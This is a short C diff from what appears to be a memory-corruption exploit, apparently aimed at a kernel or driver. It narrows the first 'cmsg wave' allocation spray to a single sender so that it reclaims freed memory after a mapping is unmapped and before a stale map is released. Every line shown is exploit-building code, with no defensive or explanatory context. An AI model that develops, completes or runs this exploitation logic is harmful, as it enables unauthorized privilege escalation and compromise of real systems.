@@ -22,6 +22,7 @@
 #define T870_FOPS_TABLE_OFF 0x2000ULL
 #define T870_ORDER3_SIZE 0x8000ULL
 
+#define T870_FIRST_CMSG_SENDERS 1U
 struct t870_bridge_resources {
     struct t870_cmsg_wave first;
     struct t870_cmsg_wave second;
@@ -146,10 +147,11 @@ int t870_bridge_worker(void *opaque)
         context->hooks.mark_nonretryable(context->hooks.opaque);
 
     /* These allocations must occur after map B was unmapped. */
-    count = t870_cmsg_wave_start(&resources->first);
-    printf("[*] bridge first wave blocked=%u/%u\n", count,
-           T870_CMSG_WAVE_SENDERS);
-    if (count != T870_CMSG_WAVE_SENDERS)
+    count = t870_cmsg_wave_start_count(&resources->first,
+                                      T870_FIRST_CMSG_SENDERS);
+    printf("[*] bridge first wave blocked=%u/%u ordered_single_reclaim=1\n",
+           count, T870_FIRST_CMSG_SENDERS);
+    if (count != T870_FIRST_CMSG_SENDERS)
         return dirty_failure(context, "first-wave");
 
     if (context->hooks.release_stale_map(context->hooks.opaque) != 0)
